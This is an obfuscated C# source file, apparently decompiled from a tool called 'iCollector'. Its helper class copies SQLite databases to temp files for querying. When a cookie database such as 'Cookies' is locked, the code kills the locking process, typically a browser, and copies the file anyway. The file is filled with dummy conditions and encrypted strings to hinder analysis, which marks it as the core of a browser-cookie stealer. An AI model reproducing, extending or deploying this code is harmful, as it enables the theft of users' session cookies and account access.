using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using iCollector.Util;
using Microsoft.Data.Sqlite;

namespace iCollector.Job.Handler;

internal class DataSourceHelper
{
	private static string CLAZZ_NAME_SE = "DataSourceHelper";

	private static string CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);

	private static readonly string LOG_01_1_SE = "Get Connection: ";

	private static readonly string LOG_01_1 = SecurityUtils.ReadStructEncrypted(LOG_01_1_SE);

	private static readonly string LOG_02_1_SE;

	private static readonly string LOG_02_1;

	private static readonly string LOG_03_1_SE;

	private static readonly string LOG_03_1;

	private static readonly string LOG_03_2_SE;

	private static readonly string LOG_03_2;

	private static readonly string LOG_04_1_SE;

	private static readonly string LOG_04_1;

	private static readonly string DATA_SOURCE_SE;

	private static readonly string DATA_SOURCE;

	private static readonly string CK_1_SE;

	private static readonly string CK_1;

	private static readonly string CK_2_SE;

	private static readonly string CK_2;

	private static Logger log;

	private static LogContext ctx;

	public static SqliteConnection GetConnection(string dataSource)
	{
		return GetConnection(dataSource, isTemp: true);
	}

	public static SqliteConnection GetConnection(string dataSource, bool isTemp)
	{
		Logger logger = log;
		LogContext logContext = ctx;
		string message = LOG_01_1 + dataSource;
		if (0 == 0)
		{
			logger.Info(logContext, message);
		}
		try
		{
			int num;
			if (5u != 0)
			{
				num = 100;
			}
			string text = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
			string text2;
			if (7u != 0)
			{
				text2 = text;
			}
			bool flag = default(bool);
			if (0 == 0)
			{
				flag = false;
			}
			Exception ex = default(Exception);
			if (0 == 0)
			{
				ex = null;
			}
			List<Process> list2 = default(List<Process>);
			int num2 = default(int);
			while (num-- > 0)
			{
				try
				{
					List<Process> list = ProcessUtil.WhoIsLocking(dataSource);
					if (0 == 0)
					{
						list2 = list;
					}
					if (list2.Count > 0 && (dataSource.Contains(CK_1) || dataSource.Contains(CK_2)))
					{
						Logger logger2 = log;
						LogContext logContext2 = ctx;
						string lOG_02_ = LOG_02_1;
						int count = list2.Count;
						if (0 == 0)
						{
							num2 = count;
						}
						string message2 = lOG_02_ + num2;
						if (0 == 0)
						{
							logger2.Info(logContext2, message2);
						}
						Process process = list2[0];
						if (0 == 0)
						{
							process.Kill();
						}
					}
					if (5u != 0)
					{
						File.Copy(dataSource, text2);
					}
					Logger logger3 = log;
					LogContext logContext3 = ctx;
					string message3 = LOG_03_1 + text2 + LOG_03_2 + num;
					if (2u != 0)
					{
						logger3.Info(logContext3, message3);
					}
					if (8u != 0)
					{
						flag = true;
					}
				}
				catch (Exception ex2)
				{
					ex = ex2;
					continue;
				}
				break;
			}
			if (false || flag)
			{
				return new SqliteConnection(DATA_SOURCE + text2);
			}
			if (ex != null)
			{
				throw ex;
			}
			throw new InvalidOperationException(LOG_04_1 + dataSource);
		}
		catch (Exception ex3)
		{
			while (true)
			{
				if (false || 7 == 0 || !isTemp)
				{
					if (8 == 0)
					{
						continue;
					}
					if (0 == 0)
					{
						break;
					}
				}
				return GetConnection(dataSource, isTemp: false);
			}
			throw ex3;
		}
	}

	public static bool ExecuteQuery(string dataSource, string sql, Consumer<SqliteDataReader>.Accept consumerReader, int maxLine)
	{
		try
		{
			using SqliteConnection sqliteConnection = GetConnection(dataSource);
			if (0 == 0)
			{
				sqliteConnection.Open();
			}
			SqliteCommand sqliteCommand = sqliteConnection.CreateCommand();
			sqliteCommand.CommandText = sql;
			SqliteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();
			try
			{
				int num = default(int);
				if (7u != 0 && 0 == 0)
				{
					num = 0;
				}
				int num2 = default(int);
				bool result = default(bool);
				if (0 == 0)
				{
					num2 = 0;
					if (false)
					{
						return result;
					}
				}
				while (sqliteDataReader.Read())
				{
					try
					{
						int num3 = num + 1;
						int num4 = 0;
						while (true)
						{
							if (num4 == 0 && 8u != 0)
							{
								num = num3;
							}
							num3 = maxLine;
							num4 = 0;
							if (num4 != 0)
							{
								continue;
							}
							if (num3 <= num4)
							{
								break;
							}
							num3 = num;
							num4 = maxLine;
							if (false)
							{
								continue;
							}
							if (num3 <= num4)
							{
								break;
							}
							if (5u != 0)
							{
								if (0 == 0)
								{
									result = true;
									return result;
								}
								return result;
							}
							return result;
						}
						if (0 == 0 && 0 == 0)
						{
							consumerReader(sqliteDataReader);
						}
						do
						{
							if (0 == 0 && 0 == 0)
							{
								num2 = 0;
							}
						}
						while (1 == 0);
					}
					catch (Exception ex)
					{
						int num5 = num2;
						int num6 = 1;
						while (true)
						{
							num2 = num5 + num6;
							log.Error(ctx, ex.ToString());
							num5 = num2;
							while (true)
							{
								num6 = 100;
								if (num6 == 0)
								{
									break;
								}
								if (num5 > num6)
								{
									num5 = 0;
									if (num5 == 0)
									{
										return (byte)num5 != 0;
									}
									continue;
								}
								goto end_IL_0097;
							}
							continue;
							end_IL_0097:
							break;
						}
					}
				}
				if (uint.MaxValue != 0)
				{
					return true;
				}
				return result;
			}
			finally
			{
				while (sqliteDataReader != null)
				{
					if (0 == 0)
					{
						((IDisposable)sqliteDataReader).Dispose();
						break;
					}
				}
			}
		}
		catch (Exception ex2)
		{
			log.Error(ctx, ex2.ToString());
			bool result;
			do
			{
				result = false;
			}
			while (false);
			return result;
		}
	}

	public static SqliteConnection OpenConnection(string dataSource)
	{
		try
		{
			SqliteConnection result;
			do
			{
				if (uint.MaxValue != 0)
				{
					SqliteConnection connection = GetConnection(dataSource);
					connection.Open();
					if (false)
					{
						return result;
					}
					if (2u != 0)
					{
						result = connection;
					}
				}
			}
			while (8 == 0);
			return result;
		}
		catch (Exception ex)
		{
			log.Error(ctx, ex.ToString());
			return null;
		}
	}

	public static bool ExecuteQuery(SqliteConnection connection, string sql, Consumer<SqliteDataReader>.Accept consumerReader, int maxLine)
	{
		try
		{
			SqliteCommand sqliteCommand = connection.CreateCommand();
			sqliteCommand.CommandText = sql;
			using SqliteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();
			int num = default(int);
			if (0 == 0 && 5u != 0)
			{
				num = 0;
			}
			int num2 = default(int);
			if (0 == 0)
			{
				num2 = 0;
			}
			bool result = default(bool);
			while (true)
			{
				if (sqliteDataReader.Read())
				{
					try
					{
						int num3 = num + 1;
						if (2u != 0 && 0 == 0)
						{
							num = num3;
						}
						int num4 = maxLine;
						if (-1 == 0)
						{
							goto IL_003c;
						}
						if (num4 > 0)
						{
							goto IL_0037;
						}
						goto IL_0048;
						IL_0048:
						if ((0 == 0) ? true : false)
						{
							consumerReader(sqliteDataReader);
						}
						do
						{
							if (0 == 0 && 7u != 0)
							{
								num2 = 0;
							}
						}
						while (7 == 0);
						if (3 == 0)
						{
							goto IL_0037;
						}
						goto end_IL_0029;
						IL_0037:
						if (num > maxLine)
						{
							num4 = 1;
							goto IL_003c;
						}
						goto IL_0048;
						IL_003c:
						do
						{
							if (0 == 0 && 3u != 0)
							{
								if (0 == 0)
								{
									result = (byte)num4 != 0;
									return result;
								}
								return result;
							}
						}
						while (1 == 0);
						return result;
						end_IL_0029:;
					}
					catch (Exception ex)
					{
						int num5 = num2 + 1;
						while (true)
						{
							num2 = num5;
							log.Error(ctx, ex.ToString());
							if (num2 > 100)
							{
								num5 = 0;
								if (num5 == 0)
								{
									return (byte)num5 != 0;
								}
								continue;
							}
							break;
						}
					}
				}
				else
				{
					if (0 == 0)
					{
						result = true;
					}
					if (4u != 0 && 8u != 0)
					{
						break;
					}
				}
			}
			return result;
		}
		catch (Exception ex2)
		{
			if (0 == 0)
			{
				log.Error(ctx, ex2.ToString());
				return false;
			}
			bool result;
			return result;
		}
	}

	public static byte[] GetBytes(SqliteDataReader reader, int idx)
	{
		byte[] array2 = default(byte[]);
		long num2;
		if (3u != 0)
		{
			byte[] array = new byte[2048];
			if (0 == 0)
			{
				if (5u != 0)
				{
					array2 = array;
				}
				if (false)
				{
					goto IL_001d;
				}
			}
			long num = 0L;
			if (3u != 0 && 3u != 0)
			{
				num2 = num;
			}
		}
		goto IL_001d;
		IL_001d:
		MemoryStream memoryStream2 = default(MemoryStream);
		do
		{
			MemoryStream memoryStream = new MemoryStream();
			if (7 == 0)
			{
				break;
			}
			if (0 == 0)
			{
				memoryStream2 = memoryStream;
			}
		}
		while (3 == 0);
		try
		{
			byte[] result;
			while (true)
			{
				long bytes;
				long num3 = (bytes = ((IDataRecord)reader).GetBytes(idx, num2, array2, 0, array2.Length));
				long num4 = 0L;
				if (uint.MaxValue != 0)
				{
					if (num3 <= num4)
					{
						do
						{
							byte[] array3 = memoryStream2.ToArray();
							if (uint.MaxValue != 0 && 2u != 0)
							{
								result = array3;
							}
						}
						while (false);
						if (0 == 0)
						{
							break;
						}
						continue;
					}
					do
					{
						MemoryStream memoryStream3 = memoryStream2;
						byte[] buffer = array2;
						int count = (int)bytes;
						if (0 == 0 && 8u != 0)
						{
							memoryStream3.Write(buffer, 0, count);
						}
					}
					while (3 == 0);
					num3 = num2;
					num4 = bytes;
				}
				long num5 = num3 + num4;
				if (0 == 0 && 0 == 0)
				{
					num2 = num5;
				}
			}
			return result;
		}
		finally
		{
			if (memoryStream2 != null && 0 == 0)
			{
				((IDisposable)memoryStream2).Dispose();
			}
		}
	}

	static DataSourceHelper()
	{
		do
		{
			LOG_02_1_SE = "================================================ Found process locked: ";
			LOG_02_1 = SecurityUtils.ReadStructEncrypted(LOG_02_1_SE);
			LOG_03_1_SE = "Created temp to : ";
			LOG_03_1 = SecurityUtils.ReadStructEncrypted(LOG_03_1_SE);
			LOG_03_2_SE = " at retry time: ";
		}
		while (false);
		LOG_03_2 = SecurityUtils.ReadStructEncrypted(LOG_03_2_SE);
		LOG_04_1_SE = "can not get connection from data source ";
		LOG_04_1 = SecurityUtils.ReadStructEncrypted(LOG_04_1_SE);
		DATA_SOURCE_SE = "Data Source=";
		DATA_SOURCE = SecurityUtils.ReadStructEncrypted(DATA_SOURCE_SE);
		CK_1_SE = "Cookies";
		CK_1 = SecurityUtils.ReadStructEncrypted(CK_1_SE);
		CK_2_SE = "cookie";
		CK_2 = SecurityUtils.ReadStructEncrypted(CK_2_SE);
		log = Logger.Instance();
		ctx = new LogContext(CLAZZ_NAME);
	}
}
